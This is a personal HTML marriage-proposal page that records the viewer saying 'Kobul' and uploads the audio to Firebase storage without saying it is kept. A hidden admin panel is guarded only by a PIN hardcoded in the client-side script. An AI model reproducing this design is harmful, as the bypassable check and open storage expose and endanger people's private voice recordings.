<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>For My Love</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;600&display=swap" rel="stylesheet">

<style>
*{
  margin:0;
  padding:0;
  box-sizing:border-box;
  font-family:'Playfair Display',serif;
}

body{
  background:#000;
  color:#fff;
  min-height:100vh;
  overflow:hidden;
}

/* subtle animated glow background */
body::before{
  content:"";
  position:fixed;
  inset:-50%;
  background:radial-gradient(circle at center,rgba(212,175,55,.12),transparent 60%);
  animation:slowGlow 12s ease-in-out infinite;
  pointer-events:none;
}
@keyframes slowGlow{
  0%{transform:scale(1)}
  50%{transform:scale(1.15)}
  100%{transform:scale(1)}
}

.screen{
  min-height:100vh;
  display:flex;
  flex-direction:column;
  align-items:center;
  justify-content:center;
  text-align:center;
  padding:20px;
  animation:fadeIn 1.6s ease forwards;
}

.hidden{display:none}

h1,h2,p{
  opacity:0;
  animation:textReveal 1.4s ease forwards;
}
h2{animation-delay:.4s}
p{animation-delay:.7s}

@keyframes textReveal{
  from{opacity:0;transform:translateY(30px)}
  to{opacity:1;transform:none}
}

.btn{
  margin-top:22px;
  padding:14px 42px;
  border-radius:999px;
  border:none;
  font-size:18px;
  cursor:pointer;
  background:linear-gradient(135deg,#d4af37,#fff1b8,#c89b3c);
  box-shadow:0 0 25px rgba(212,175,55,.5);
  transition:all .35s ease;
  animation:btnPop 1s ease forwards;
}
.btn:hover{
  transform:scale(1.07);
  box-shadow:0 0 40px rgba(212,175,55,.9);
}

@keyframes btnPop{
  from{opacity:0;transform:scale(.85)}
  to{opacity:1;transform:scale(1)}
}

/* admin key */
#adminKey{
  position:fixed;
  right:14px;
  bottom:14px;
  font-size:22px;
  opacity:.65;
  cursor:pointer;
  transition:.3s;
}
#adminKey:hover{opacity:1}

/* admin panel */
.adminPanel{
  position:fixed;
  inset:0;
  background:rgba(0,0,0,.92);
  z-index:9999;
  padding:25px;
  overflow:auto;
  animation:fadeIn .6s ease forwards;
}

.voiceItem{
  margin:16px 0;
  padding:14px;
  border:1px solid #d4af37;
  border-radius:12px;
}
</style>
</head>

<body>

<div id="step1" class="screen">
  <h1>I love you my Jan Prapti ‚ù§Ô∏è</h1>
  <h2>Will you marry me?</h2>
  <button class="btn" onclick="goStep2()">Yes</button>
  <button class="btn" onclick="alert('No option is disabled üòå')">No</button>
</div>

<div id="step2" class="screen hidden">
  <h2>Say ‚ÄúKobul‚Äù üéôÔ∏è</h2>
  <p>Tap & speak from heart</p>
  <button class="btn" onclick="startRec()">üé§ Start</button>
  <button class="btn hidden" id="stopBtn" onclick="stopRec()">Stop</button>
</div>

<div id="step3" class="screen hidden">
  <h2>Fingerprint Verification ‚ú®</h2>
  <button class="btn" onclick="complete()">Scan Finger</button>
</div>

<div id="step4" class="screen hidden">
  <h1>Marriage Complete üíç</h1>
  <p>Abdullah is now your husband</p>
  <button class="btn" onclick="downloadCert()">Download Certificate</button>
</div>

<div id="adminKey" onclick="openAdmin()">üîë</div>

<audio autoplay loop>
  <source src="https://github.com/warriorcheat/Surprise-for-my-jan/raw/refs/heads/main/music.mp3">
</audio>

<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-storage-compat.js"></script>

<script>
firebase.initializeApp({
  apiKey:"AIzaSyCXXYQnIt8ovhEidRTx-B3S0k9DZV1oi7M",
  authDomain:"for-my-love-5c7c1.firebaseapp.com",
  projectId:"for-my-love-5c7c1",
  storageBucket:"for-my-love-5c7c1.firebasestorage.app",
  appId:"1:770806135468:web:f36370075360be8d1fbd09"
});
const storage=firebase.storage();

function goStep2(){
  step1.classList.add("hidden");
  step2.classList.remove("hidden");
}

let recorder,chunks=[];
async function startRec(){
  const s=await navigator.mediaDevices.getUserMedia({audio:true});
  recorder=new MediaRecorder(s);
  chunks=[];
  recorder.ondataavailable=e=>chunks.push(e.data);
  recorder.start();
  stopBtn.classList.remove("hidden");
}
function stopRec(){
  recorder.stop();
  recorder.onstop=async()=>{
    const blob=new Blob(chunks,{type:"audio/webm"});
    await storage.ref("voices/"+Date.now()+".webm").put(blob);
    step2.classList.add("hidden");
    step3.classList.remove("hidden");
  }
}

function complete(){
  step3.classList.add("hidden");
  step4.classList.remove("hidden");
}

function downloadCert(){
  const t="Marriage Certificate\nAbdullah ‚ù§Ô∏è Prapti";
  const b=new Blob([t],{type:"text/plain"});
  const a=document.createElement("a");
  a.href=URL.createObjectURL(b);
  a.download="Marriage-Certificate.txt";
  a.click();
}

/* admin */
function openAdmin(){
  const o=document.createElement("div");
  o.className="adminPanel";
  o.innerHTML=`
    <h2>Admin Login</h2>
    <input id="pin" type="password" placeholder="PIN" style="padding:12px;width:100%;margin:15px 0">
    <button class="btn" onclick="checkPin()">Unlock</button>
  `;
  document.body.appendChild(o);
}
async function checkPin(){
  if(pin.value!=="112211"){alert("Wrong PIN");return}
  document.body.lastChild.remove();
  const p=document.createElement("div");
  p.className="adminPanel";
  p.innerHTML="<h2>Saved Voices</h2>";
  const list=await storage.ref("voices").listAll();
  for(const i of list.items){
    const u=await i.getDownloadURL();
    p.innerHTML+=`
      <div class="voiceItem">
        <audio controls src="${u}"></audio><br>
        <a href="${u}" download>Download</a>
        <button onclick="storage.ref('${i.fullPath}').delete().then(()=>location.reload())">Delete</button>
      </div>`;
  }
  p.innerHTML+=`<button class="btn" onclick="this.parentElement.remove()">Close</button>`;
  document.body.appendChild(p);
}
</script>

</body>
</html>
